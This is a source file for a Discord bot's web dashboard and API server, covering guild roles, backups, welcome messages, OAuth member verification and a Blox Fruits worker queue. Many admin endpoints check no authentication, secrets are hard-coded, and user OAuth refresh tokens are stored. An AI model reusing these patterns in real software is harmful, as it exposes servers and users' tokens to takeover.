      console.error("Error claiming ticket:", err);
      await interaction.editReply({ content: "Failed to claim ticket." });
    }
    return;
  }

  if (interaction.customId === "verify_member") {
    if (interaction.guildId === '1254568460764053566') {
      return interaction.reply({ content: "❌ ميزة التحقق معطلة في هذا السيرفر بناءً على طلب المالك.", ephemeral: true });
    }
    let appUrl = APP_URL || "";
    appUrl = appUrl.replace(/\/$/, "");
    const REDIRECT_URI = `${appUrl}/api/auth/callback`;
    const OAUTH_URL = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds.join&state=${interaction.guildId}`;

    const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder()
        .setLabel("اضغط هنا للتحقق")
        .setURL(OAUTH_URL)
        .setStyle(ButtonStyle.Link)
    );

    await interaction.reply({ content: "يرجى الضغط على الرابط أدناه للتحقق من حسابك:", components: [row], ephemeral: true });
  }
} catch (err) {
  const interactionId = (interaction as any).customId || (interaction as any).commandName || "unknown";
  console.error(`Global interaction error [${interaction.type}] (${interactionId}):`, err);
  try {
    if (interaction.isRepliable()) {
      if (interaction.deferred || interaction.replied) {
        await interaction.editReply({ content: "An error occurred while processing this interaction." }).catch(() => {});
      } else {
        await interaction.reply({ content: "An error occurred while processing this interaction.", ephemeral: true }).catch(() => {});
      }
    }
  } catch (innerErr) {
    console.error("Failed to send error reply:", innerErr);
  }
}
});

async function refreshAccessToken(refreshToken: string) {
  try {
    const response = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
      client_id: DISCORD_CLIENT_ID!,
      client_secret: DISCORD_CLIENT_SECRET!,
      grant_type: 'refresh_token',
      refresh_token: refreshToken,
    }), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });
    return response.data;
  } catch (err) {
    console.error("Failed to refresh access token:", err);
    return null;
  }
}

// API Routes
// Removed from global scope to be inside startServer for better reliability

async function startServer() {
  console.log("Starting server initialization...");
  const app = express();
  const PORT = process.env.PORT || 3000;

  app.use(express.json());
  app.use(cookieParser());
  app.set('trust proxy', 1); // Trust first proxy (Cloud Run)
  
  console.log("Setting up session store...");
  const SqliteStore = SQLiteStore(session);
  const sessionStore = new SqliteStore({
    client: db,
    expired: {
      clear: true,
      intervalMs: 900000 // 15 minutes
    }
  });

  app.use(session({
    store: sessionStore,
    secret: JWT_SECRET || 'requiem-persistent-secret-key-99',
    resave: false,
    saveUninitialized: false,
    proxy: true,
    cookie: { 
      secure: true, 
      sameSite: 'none',
      maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
    }
  }));

  console.log("Defining API routes...");
  // API Routes
  app.get("/api/status", (req, res) => {
    try {
      res.json({
        status: client.isReady() ? "online" : "offline",
        guilds: client.guilds.cache.size,
        users: client.users.cache.size,
        uptime: client.uptime || 0,
        tag: client.user?.tag || "Bot Offline",
      });
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch status" });
    }
  });

  app.get("/api/ping", (req, res) => {
    res.json({ status: "pong", timestamp: Date.now() });
  });

  // Role Management Endpoints
  app.get("/api/guilds/:guildId/roles", async (req, res) => {
    try {
      const guild = await client.guilds.fetch(req.params.guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      const roles = guild.roles.cache.map(r => ({
        id: r.id,
        name: r.name,
        color: r.hexColor,
        position: r.position,
        permissions: r.permissions.toArray(),
        managed: r.managed
      }));
      res.json(roles);
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch roles" });
    }
  });

  app.post("/api/guilds/:guildId/roles", async (req, res) => {
    try {
      const guild = await client.guilds.fetch(req.params.guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      const { name, color, permissions } = req.body;
      const role = await guild.roles.create({
        name: name || "New Role",
        color: color || "#99AAB5",
        permissions: permissions || []
      });
      res.json({
        id: role.id,
        name: role.name,
        color: role.hexColor,
        position: role.position,
        permissions: role.permissions.toArray(),
        managed: role.managed
      });
    } catch (err) {
      res.status(500).json({ error: "Failed to create role" });
    }
  });

  app.patch("/api/guilds/:guildId/roles/:roleId", async (req, res) => {
    try {
      const guild = await client.guilds.fetch(req.params.guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      const role = await guild.roles.fetch(req.params.roleId);
      if (!role) return res.status(404).json({ error: "Role not found" });
      const { name, color, permissions } = req.body;
      await role.edit({ name, color, permissions });
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to update role" });
    }
  });

  app.delete("/api/guilds/:guildId/roles/:roleId", async (req, res) => {
    try {
      const guild = await client.guilds.fetch(req.params.guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      const role = await guild.roles.fetch(req.params.roleId);
      if (!role) return res.status(404).json({ error: "Role not found" });
      await role.delete();
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to delete role" });
    }
  });

  app.get("/api/stats", (req, res) => {
    try {
      const totalMessages = db.prepare("SELECT COUNT(DISTINCT userId) as count FROM leveling").get() as any;
      const topLevels = db.prepare("SELECT userId, MAX(level) as level, SUM(xp) as xp FROM leveling GROUP BY userId ORDER BY level DESC, xp DESC LIMIT 5").all();
      const openTickets = db.prepare("SELECT COUNT(*) as count FROM tickets WHERE status = 'open'").get() as any;

      res.json({
        totalUsers: totalMessages?.count || 0,
        topLevels: topLevels || [],
        openTickets: openTickets?.count || 0,
      });
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch stats" });
    }
  });

  app.get("/api/guilds/:guildId/stats", (req, res) => {
    try {
      const { guildId } = req.params;
      const totalUsers = db.prepare("SELECT COUNT(DISTINCT userId) as count FROM leveling WHERE guildId = ?").get(guildId) as any;
      const topLevels = db.prepare("SELECT userId, level, xp FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC LIMIT 5").all(guildId);
      const openTickets = db.prepare("SELECT COUNT(*) as count FROM tickets WHERE guildId = ? AND status = 'open'").get(guildId) as any;

      res.json({
        totalUsers: totalUsers?.count || 0,
        topLevels: topLevels || [],
        openTickets: openTickets?.count || 0,
      });
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch guild stats" });
    }
  });

  app.get("/api/guilds", async (req, res) => {
    try {
      if (!client.isReady()) return res.json([]);
      
      const guilds = await Promise.all(client.guilds.cache.map(async (guild) => {
        let inviteUrl = null;
        try {
          // Try to find an existing invite
          const invites = await guild.invites.fetch();
          const invite = invites.first();
          if (invite) {
            inviteUrl = invite.url;
          } else {
            // Try to create one in the first text channel
            const channel = guild.channels.cache.find(c => c.type === ChannelType.GuildText) as any;
            if (channel && channel.permissionsFor(guild.members.me!).has(PermissionFlagsBits.CreateInstantInvite)) {
              const newInvite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
              inviteUrl = newInvite.url;
            }
          }
        } catch (e) {
          // Ignore errors (likely missing permissions)
        }

        return {
          id: guild.id,
          name: guild.name,
          icon: guild.iconURL(),
          memberCount: guild.memberCount,
          invite: inviteUrl
        };
      }));

      res.json(guilds);
    } catch (err) {
      console.error("Failed to fetch guilds:", err);
      res.status(500).json({ error: "Failed to fetch guilds" });
    }
  });

  app.get("/api/guilds/:guildId/channels", async (req, res) => {
    try {
      const { guildId } = req.params;
      const guild = client.guilds.cache.get(guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      
      const channels = guild.channels.cache
        .filter(c => c.type === ChannelType.GuildText)
        .map(c => ({ id: c.id, name: c.name }));
      
      res.json(channels);
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch channels" });
    }
  });

  app.get("/api/guilds/:guildId/roles", async (req, res) => {
    try {
      const { guildId } = req.params;
      const guild = client.guilds.cache.get(guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });
      
      const roles = guild.roles.cache
        .filter(r => r.name !== "@everyone" && !r.managed)
        .map(r => ({ id: r.id, name: r.name, color: r.hexColor }));
      
      res.json(roles);
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch roles" });
    }
  });

  app.get("/api/guilds/:guildId/welcome", (req, res) => {
    try {
      const { guildId } = req.params;
      let welcome = db.prepare("SELECT * FROM welcome_settings WHERE guildId = ?").get(guildId) as any;
      if (!welcome) {
        welcome = { guildId, channelId: null, message: 'Welcome {user} to {server}!', imageEnabled: 1, dmEnabled: 0, dmMessage: 'Welcome to {server}!' };
        db.prepare("INSERT INTO welcome_settings (guildId, channelId, message, imageEnabled, dmEnabled, dmMessage) VALUES (?, ?, ?, ?, ?, ?)").run(guildId, null, welcome.message, 1, 0, welcome.dmMessage);
      }
      res.json(welcome);
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch welcome settings" });
    }
  });

  app.post("/api/guilds/:guildId/welcome", express.json(), (req, res) => {
    try {
      const { guildId } = req.params;
      const { channelId, message, imageEnabled, dmEnabled, dmMessage } = req.body;
      db.prepare("INSERT OR REPLACE INTO welcome_settings (guildId, channelId, message, imageEnabled, dmEnabled, dmMessage) VALUES (?, ?, ?, ?, ?, ?)")
        .run(guildId, channelId, message, imageEnabled ? 1 : 0, dmEnabled ? 1 : 0, dmMessage);
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to update welcome settings" });
    }
  });

  app.get("/api/guilds/:guildId/auto-roles", (req, res) => {
    try {
      const { guildId } = req.params;
      const roles = db.prepare("SELECT roleId FROM auto_roles WHERE guildId = ?").all(guildId) as any[];
      res.json(roles.map(r => r.roleId));
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch auto-roles" });
    }
  });

  app.post("/api/guilds/:guildId/auto-roles", express.json(), async (req, res) => {
    try {
      const { guildId } = req.params;
      const { roleIds } = req.body;
      db.prepare("DELETE FROM auto_roles WHERE guildId = ?").run(guildId);
      const insert = db.prepare("INSERT INTO auto_roles (guildId, roleId) VALUES (?, ?)");
      for (const roleId of roleIds) {
        insert.run(guildId, roleId);
      }

      // Apply roles to all members in the background
      const guild = client.guilds.cache.get(guildId);
      if (guild) {
        guild.members.fetch().then(members => {
          members.forEach(member => {
            for (const roleId of roleIds) {
              if (!member.roles.cache.has(roleId)) {
                member.roles.add(roleId).catch(() => {});
              }
            }
          });
        }).catch(err => console.error("Failed to fetch members for auto-role update:", err));
      }

      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to update auto-roles" });
    }
  });

  app.get("/api/guilds/:guildId/badwords", (req, res) => {
    try {
      const { guildId } = req.params;
      const words = db.prepare("SELECT word FROM badwords WHERE guildId = ?").all(guildId) as any[];
      res.json(words.map(w => w.word));
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch badwords" });
    }
  });

  app.post("/api/guilds/:guildId/badwords", express.json(), (req, res) => {
    try {
      const { guildId } = req.params;
      const { words } = req.body;
      db.prepare("DELETE FROM badwords WHERE guildId = ?").run(guildId);
      const insert = db.prepare("INSERT INTO badwords (guildId, word) VALUES (?, ?)");
      for (const word of words) {
        insert.run(guildId, word);
      }
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to update badwords" });
    }
  });

  app.get("/api/guilds/:guildId/aliases", (req, res) => {
    try {
      const { guildId } = req.params;
      const aliases = db.prepare("SELECT * FROM aliases WHERE guildId = ?").all(guildId);
      res.json(aliases);
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch aliases" });
    }
  });

  app.post("/api/guilds/:guildId/aliases", express.json(), async (req, res) => {
    try {
      const { guildId } = req.params;
      const { aliasName, originalCommand } = req.body;
      
      const guild = client.guilds.cache.get(guildId);
      if (!guild) return res.status(404).json({ error: "Guild not found" });

      // Register with Discord immediately
      const globalCommands = await client.application?.commands.fetch();
      const original = globalCommands?.find(c => c.name === originalCommand);
      
      if (!original) return res.status(400).json({ error: "Original command not found" });

      await guild.commands.create({
        name: aliasName,
        description: `Shortcut for /${originalCommand}`,
        options: original.options as any
      });

      db.prepare("INSERT OR REPLACE INTO aliases (guildId, aliasName, originalCommand) VALUES (?, ?, ?)")
        .run(guildId, aliasName, originalCommand);
      
      res.json({ success: true });
    } catch (err) {
      console.error("Failed to create alias:", err);
      res.status(500).json({ error: "Failed to create alias" });
    }
  });

  app.delete("/api/guilds/:guildId/aliases/:aliasName", async (req, res) => {
    try {
      const { guildId, aliasName } = req.params;
      const guild = client.guilds.cache.get(guildId);
      
      if (guild) {
        const commands = await guild.commands.fetch();
        const cmd = commands.find(c => c.name === aliasName);
        if (cmd) await cmd.delete();
      }

      db.prepare("DELETE FROM aliases WHERE guildId = ? AND aliasName = ?").run(guildId, aliasName);
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to delete alias" });
    }
  });

  app.get("/api/logs", (req, res) => {
    res.json({ logs });
  });

  const JWT_SECRET = 'requiem-jwt-secret-8877';

  // Middleware to extract user from JWT if present in Authorization header
  app.use((req, res, next) => {
    const authHeader = req.headers.authorization;
    if (authHeader && authHeader.startsWith('Bearer ')) {
      const token = authHeader.substring(7);
      try {
        const decoded = jwt.verify(token, JWT_SECRET) as any;
        (req as any).user = decoded;
      } catch (err) {
        console.error("JWT Verification Error:", err.message);
      }
    }
    next();
  });

  app.get("/api/guilds/:guildId/protection", (req, res) => {
    const { guildId } = req.params;
    const settings = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guildId) || {
      guildId,
      antiLink: 0,
      antiSpam: 0,
      antiRaid: 0,
      antiBot: 0,
      antiChannelControl: 0,
      logChannel: null
    };
    res.json(settings);
  });

  app.get("/api/guilds/:guildId/whitelisted-bots", (req, res) => {
    const { guildId } = req.params;
    const bots = db.prepare("SELECT * FROM whitelisted_bots WHERE guildId = ?").all(guildId);
    res.json(bots);
  });

  app.post("/api/guilds/:guildId/whitelisted-bots", (req, res) => {
    const { guildId } = req.params;
    const { botId } = req.body;
    db.prepare("INSERT OR IGNORE INTO whitelisted_bots (guildId, botId) VALUES (?, ?)").run(guildId, botId);
    res.json({ status: 'ok' });
  });

  app.delete("/api/guilds/:guildId/whitelisted-bots/:botId", (req, res) => {
    const { guildId, botId } = req.params;
    db.prepare("DELETE FROM whitelisted_bots WHERE guildId = ? AND botId = ?").run(guildId, botId);
    res.json({ status: 'ok' });
  });

  app.get("/api/guilds/:guildId/backups", (req, res) => {
    const { guildId } = req.params;
    const backups = db.prepare("SELECT * FROM backups WHERE guildId = ? ORDER BY createdAt DESC").all(guildId);
    res.json(backups);
  });

  app.post("/api/guilds/:guildId/backups", async (req, res) => {
    const { guildId } = req.params;
    const guild = client.guilds.cache.get(guildId);
    if (!guild) return res.status(404).json({ error: "Guild not found" });

    try {
      const roles = guild.roles.cache
        .filter(r => !r.managed && r.id !== guild.id)
        .map(r => ({
          name: r.name,
          color: r.color,
          hoist: r.hoist,
          permissions: r.permissions.bitfield.toString(),
          mentionable: r.mentionable,
          position: r.position
        }));

      const channels = guild.channels.cache.map(c => ({
        name: c.name,
        type: c.type,
        parentId: c.parentId,
        topic: (c as any).topic || null,
        nsfw: (c as any).nsfw || false,
        rateLimitPerUser: (c as any).rateLimitPerUser || 0,
        permissionOverwrites: (c as any).permissionOverwrites?.cache.map((o: any) => ({
          id: o.id,
          type: o.type,
          allow: o.allow.bitfield.toString(),
          deny: o.deny.bitfield.toString()
        })) || []
      }));

      const backupData = JSON.stringify({ roles, channels });
      const name = `Backup ${new Date().toLocaleString('ar-EG')}`;
      
      db.prepare("INSERT INTO backups (guildId, name, data) VALUES (?, ?, ?)").run(guildId, name, backupData);
      res.json({ success: true });
    } catch (err) {
      console.error("Backup failed:", err);
      res.status(500).json({ error: "Failed to create backup" });
    }
  });

  app.post("/api/guilds/:guildId/backups/:id/restore", async (req, res) => {
    const { guildId, id } = req.params;
    const guild = client.guilds.cache.get(guildId);
    if (!guild) return res.status(404).json({ error: "Guild not found" });

    const backup = db.prepare("SELECT * FROM backups WHERE guildId = ? AND id = ?").get(guildId, id) as any;
    if (!backup) return res.status(404).json({ error: "Backup not found" });

    try {
      const data = JSON.parse(backup.data);
      
      // Restore Roles
      for (const r of data.roles) {
        await guild.roles.create({
          name: r.name,
          color: r.color,
          hoist: r.hoist,
          permissions: BigInt(r.permissions),
          mentionable: r.mentionable,
          reason: "Backup Restore"
        }).catch(console.error);
      }

      // Restore Channels (Simplified: just create them)
      // Note: Re-linking parent IDs is complex as IDs change. 
      // This version just creates them in the server.
      for (const c of data.channels) {
        await guild.channels.create({
          name: c.name,
          type: c.type,
          topic: c.topic,
          nsfw: c.nsfw,
          rateLimitPerUser: c.rateLimitPerUser,
          reason: "Backup Restore"
        }).catch(console.error);
      }

      res.json({ success: true });
    } catch (err) {
      console.error("Restore failed:", err);
      res.status(500).json({ error: "Failed to restore backup" });
    }
  });

  app.delete("/api/guilds/:guildId/backups/:id", (req, res) => {
    const { guildId, id } = req.params;
    db.prepare("DELETE FROM backups WHERE guildId = ? AND id = ?").run(guildId, id);
    res.json({ success: true });
  });

  app.get("/api/guilds/:guildId/logging", (req, res) => {
    const { guildId } = req.params;
    const settings = db.prepare("SELECT * FROM logging_settings WHERE guildId = ?").get(guildId);
    res.json(settings || { 
      channelId: null, 
      logMessageDelete: 0, 
      logMessageEdit: 0, 
      logMemberJoin: 0, 
      logMemberLeave: 0, 
      logRoleUpdate: 0, 
      logChannelUpdate: 0, 
      logVoiceState: 0, 
      logCommandUsage: 0, 
      logLevelUp: 0, 
      logTicketEvents: 0, 
      logProtectionEvents: 0 
    });
  });

  app.post("/api/guilds/:guildId/logging", (req, res) => {
    const { guildId } = req.params;
    const { 
      channelId, 
      logMessageDelete, 
      logMessageEdit, 
      logMemberJoin, 
      logMemberLeave, 
      logRoleUpdate, 
      logChannelUpdate, 
      logVoiceState, 
      logCommandUsage, 
      logLevelUp, 
      logTicketEvents, 
      logProtectionEvents 
    } = req.body;

    db.prepare(`
      INSERT INTO logging_settings (
        guildId, channelId, logMessageDelete, logMessageEdit, logMemberJoin, 
        logMemberLeave, logRoleUpdate, logChannelUpdate, logVoiceState, 
        logCommandUsage, logLevelUp, logTicketEvents, logProtectionEvents
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(guildId) DO UPDATE SET 
        channelId = excluded.channelId,
        logMessageDelete = excluded.logMessageDelete,
        logMessageEdit = excluded.logMessageEdit,
        logMemberJoin = excluded.logMemberJoin,
        logMemberLeave = excluded.logMemberLeave,
        logRoleUpdate = excluded.logRoleUpdate,
        logChannelUpdate = excluded.logChannelUpdate,
        logVoiceState = excluded.logVoiceState,
        logCommandUsage = excluded.logCommandUsage,
        logLevelUp = excluded.logLevelUp,
        logTicketEvents = excluded.logTicketEvents,
        logProtectionEvents = excluded.logProtectionEvents
    `).run(
      guildId, channelId, logMessageDelete, logMessageEdit, logMemberJoin, 
      logMemberLeave, logRoleUpdate, logChannelUpdate, logVoiceState, 
      logCommandUsage, logLevelUp, logTicketEvents, logProtectionEvents
    );

    res.json({ status: 'ok' });
  });

  app.get("/api/guilds/:guildId/custom-lists", (req, res) => {
    try {
      const { guildId } = req.params;
      const lists = db.prepare("SELECT * FROM custom_lists WHERE guildId = ?").all(guildId);
      res.json(lists.map((l: any) => ({ ...l, content: JSON.parse(l.content) })));
    } catch (err) {
      res.status(500).json({ error: "Failed to fetch custom lists" });
    }
  });

  // --- BLOX FRUITS WORKER API ---
  app.get("/api/blox/next-account", (req, res) => {
    const token = req.headers['x-worker-token'];
    if (token !== process.env.BLOX_WORKER_TOKEN) return res.status(403).json({ error: "Unauthorized" });

    const account = db.prepare("SELECT * FROM blox_fruits_requests WHERE status = 'pending' ORDER BY id ASC LIMIT 1").get() as any;
    if (!account) return res.json({ status: "no_accounts" });

    db.prepare("UPDATE blox_fruits_requests SET status = 'processing' WHERE id = ?").run(account.id);
    res.json(account);
  });

  app.post("/api/blox/update-status", express.json(), (req, res) => {
    const token = req.headers['x-worker-token'];
    if (token !== process.env.BLOX_WORKER_TOKEN) return res.status(403).json({ error: "Unauthorized" });

    const { id, currentLevel, money, items, status } = req.body;
    db.prepare("UPDATE blox_fruits_requests SET currentLevel = ?, money = ?, items = ?, status = ?, lastUpdate = CURRENT_TIMESTAMP WHERE id = ?")
      .run(currentLevel, money, JSON.stringify(items), status, id);
    
    res.json({ success: true });
  });

  app.post("/api/blox/log", express.json(), (req, res) => {
    const token = req.headers['x-worker-token'];
    if (token !== process.env.BLOX_WORKER_TOKEN) return res.status(403).json({ error: "Unauthorized" });

    const { requestId, message } = req.body;
    db.prepare("INSERT INTO blox_logs (requestId, message) VALUES (?, ?)").run(requestId, message);
    res.json({ success: true });
  });
  // --- END BLOX FRUITS API ---

  app.post("/api/guilds/:guildId/custom-lists", express.json(), (req, res) => {
    try {
      const { guildId } = req.params;
      const { title, content } = req.body;
      db.prepare("INSERT INTO custom_lists (guildId, title, content) VALUES (?, ?, ?)").run(guildId, title, JSON.stringify(content));
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to create custom list" });
    }
  });

  app.delete("/api/guilds/:guildId/custom-lists/:id", (req, res) => {
    try {
      const { guildId, id } = req.params;
      db.prepare("DELETE FROM custom_lists WHERE guildId = ? AND id = ?").run(guildId, id);
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: "Failed to delete custom list" });
    }
  });

  app.post("/api/guilds/:guildId/protection", (req, res) => {
    const { guildId } = req.params;
    const { antiLink, antiSpam, antiRaid, antiBot, antiChannelControl, antiNuke, nukeLimit, logChannel, counterNuke } = req.body;
    
    db.prepare(`
      INSERT INTO protection_settings (guildId, antiLink, antiSpam, antiRaid, antiBot, antiChannelControl, antiNuke, nukeLimit, logChannel, counterNuke)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
      ON CONFLICT(guildId) DO UPDATE SET
        antiLink = excluded.antiLink,
        antiSpam = excluded.antiSpam,
        antiRaid = excluded.antiRaid,
        antiBot = excluded.antiBot,
        antiChannelControl = excluded.antiChannelControl,
        antiNuke = excluded.antiNuke,
        nukeLimit = excluded.nukeLimit,
        logChannel = excluded.logChannel,
        counterNuke = excluded.counterNuke
    `).run(
      guildId, 
      antiLink ? 1 : 0, 
      antiSpam ? 1 : 0, 
      antiRaid ? 1 : 0, 
      antiBot ? 1 : 0, 
      antiChannelControl ? 1 : 0, 
      antiNuke ? 1 : 0,
      nukeLimit || 3,
      logChannel,
      counterNuke ? 1 : 0
    );
    
    res.json({ success: true });
  });

  // Dashboard Auth Routes
  app.get("/api/auth/login", (req, res) => {
    let appUrl = APP_URL;
    const clientId = DISCORD_CLIENT_ID;

    if (!appUrl || !clientId) {
      console.error("Missing APP_URL or DISCORD_CLIENT_ID for auth login.");
      return res.status(500).send("Server configuration error: Missing APP_URL or DISCORD_CLIENT_ID. Please set these in config.ts or environment variables.");
    }

    // Remove trailing slash if present
    appUrl = appUrl.replace(/\/$/, "");

    const REDIRECT_URI = `${appUrl}/api/auth/callback/dashboard`;
    const url = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20guilds`;
    console.log(`Redirecting to Discord login: ${url}`);
    res.redirect(url);
  });

  app.get("/api/auth/callback/dashboard", async (req, res) => {
    const { code, error, error_description } = req.query;
    
    if (error) {
      console.error(`Discord OAuth Error: ${error} - ${error_description}`);
      return res.status(400).send(`Discord Error: ${error_description || error}`);
    }

    if (!code) {
      console.error("Missing code in OAuth callback. Query params:", req.query);
      return res.status(400).send("Missing code from Discord. Did you cancel the login?");
    }

    let appUrl = APP_URL;
    const clientId = DISCORD_CLIENT_ID;
    const clientSecret = DISCORD_CLIENT_SECRET;

    if (!appUrl || !clientId || !clientSecret) {
      console.error("Missing APP_URL, DISCORD_CLIENT_ID, or DISCORD_CLIENT_SECRET for auth callback.");
      return res.status(500).send("Server configuration error: Missing environment variables or config.ts settings.");
    }

    // Remove trailing slash if present
    appUrl = appUrl.replace(/\/$/, "");

    try {
      const REDIRECT_URI = `${appUrl}/api/auth/callback/dashboard`;
      console.log(`Exchanging code for token with redirect_uri: ${REDIRECT_URI}`);
      
      const response = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
        client_id: clientId,
        client_secret: clientSecret,
        grant_type: 'authorization_code',
        code: code as string,
        redirect_uri: REDIRECT_URI,
      }), {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }).catch(err => {
        console.error("Discord Token Exchange Error:", err.response?.data || err.message);
        throw err;
      });

      const { access_token } = response.data;

      const userResponse = await axios.get('https://discord.com/api/users/@me', {
        headers: { Authorization: `Bearer ${access_token}` }
      });

      const userGuildsResponse = await axios.get('https://discord.com/api/users/@me/guilds', {
        headers: { Authorization: `Bearer ${access_token}` }
      });

      const userData = userResponse.data;
      const userGuilds = userGuildsResponse.data;

      // Filter guilds where user has MANAGE_GUILD or is OWNER
      const adminGuilds = userGuilds.filter((g: any) => (BigInt(g.permissions) & BigInt(0x20)) === BigInt(0x20) || g.owner);

      const userPayload = {
        id: userData.id,
        username: userData.username,
        discriminator: userData.discriminator,
        avatar: userData.avatar,
        guilds: adminGuilds.map((g: any) => g.id)
      };

      const token = jwt.sign(userPayload, JWT_SECRET, { expiresIn: '30d' });
      console.log(`User ${userData.username} logged in. Token generated.`);
      
      // Redirect to a special page that saves the token to localStorage
      res.send(`
        <html>
          <body>
            <script>
              localStorage.setItem('requiem_token', '${token}');
              window.location.href = '/';
            </script>
            <p>Logging you in... If you are not redirected, <a href="/">click here</a>.</p>
          </body>
        </html>
      `);
    } catch (err) {
      console.error("Dashboard OAuth error:", err);
      res.status(500).send("Authentication failed.");
    }
  });

  app.get("/api/auth/me", (req, res) => {
    const user = (req as any).user || (req.session as any).user || null;
    res.json(user);
  });

  app.get("/api/auth/logout", (req, res) => {
    req.session.destroy(() => {
      res.json({ success: true });
    });
  });

  app.get("/api/auth/callback", async (req, res) => {
    const { code, state: guildId } = req.query;
    if (!code) return res.status(400).send("Missing code");

    let appUrl = APP_URL || "";
    appUrl = appUrl.replace(/\/$/, "");

    try {
      const REDIRECT_URI = `${appUrl}/api/auth/callback`;
      const response = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
        client_id: DISCORD_CLIENT_ID!,
        client_secret: DISCORD_CLIENT_SECRET!,
        grant_type: 'authorization_code',
        code: code as string,
        redirect_uri: REDIRECT_URI,
      }), {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });

      const { access_token, refresh_token, expires_in } = response.data;

      // Get user info to get the userId
      const userResponse = await axios.get('https://discord.com/api/users/@me', {
        headers: { Authorization: `Bearer ${access_token}` }
      });

      const userId = userResponse.data.id;

      // Store in DB
      db.prepare("INSERT OR REPLACE INTO tokens (userId, guildId, accessToken, refreshToken, expiresAt) VALUES (?, ?, ?, ?, ?)")
        .run(userId, guildId as string || 'unknown', access_token, refresh_token, Date.now() + expires_in * 1000);

      // Assign verified role if set
      if (guildId) {
        const protection = db.prepare("SELECT verifiedRoleId FROM protection_settings WHERE guildId = ?").get(guildId) as any;
        if (protection?.verifiedRoleId) {
          const guild = client.guilds.cache.get(guildId as string);
          if (guild) {
            const member = await guild.members.fetch(userId).catch(() => null);
            if (member) {
              const role = guild.roles.cache.get(protection.verifiedRoleId);
              if (role) {
                await member.roles.add(role).catch(console.error);
              }
            }
          }
        }
      }

      res.send(`
        <html>
          <body style="background: #1a1a2e; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
            <div style="text-align: center; background: #16213e; padding: 2rem; border-radius: 1rem; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
              <h1 style="color: #5865f2;">✅ تم التحقق بنجاح!</h1>
              <p>يمكنك الآن العودة إلى ديسكورد وإغلاق هذه الصفحة.</p>
            </div>
          </body>
        </html>
      `);
    } catch (err) {
      console.error("OAuth callback error:", err);
      res.status(500).send("فشل التحقق. يرجى المحاولة مرة أخرى.");
    }
  });

  app.post("/api/generate-image", async (req, res) => {
    const user = (req as any).user || (req.session as any).user;
    if (!user) return res.status(401).json({ error: "Unauthorized" });
    const { prompt } = req.body;
    if (!prompt) return res.status(400).json({ error: "Prompt is required" });

    try {
      const response = await ai.models.generateContent({
        model: 'gemini-3.1-flash-image-preview',
        contents: { parts: [{ text: prompt }] },
        config: { imageConfig: { aspectRatio: "1:1", imageSize: "1K" } },
      });
      
      for (const part of response.candidates[0].content.parts) {
        if (part.inlineData) {
          return res.json({ imageUrl: `data:image/png;base64,${part.inlineData.data}` });
        }
      }
      res.status(500).json({ error: "No image generated" });
    } catch (error) {
      console.error("Image generation error:", error);
      res.status(500).json({ error: "Failed to generate image" });
    }
  });

  // Prevent API 404s from falling through to SPA
  app.use("/api/*", (req, res) => {
    res.status(404).json({ error: "API route not found" });
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.resolve(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.resolve(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });

  // Start Discord Bot
  if (DISCORD_TOKEN) {
    client.login(DISCORD_TOKEN).catch(err => {
      console.error("Failed to login to Discord:", err);
    });
  } else {
    console.warn("DISCORD_TOKEN not found in environment variables or config.ts.");
  }
}

startServer();
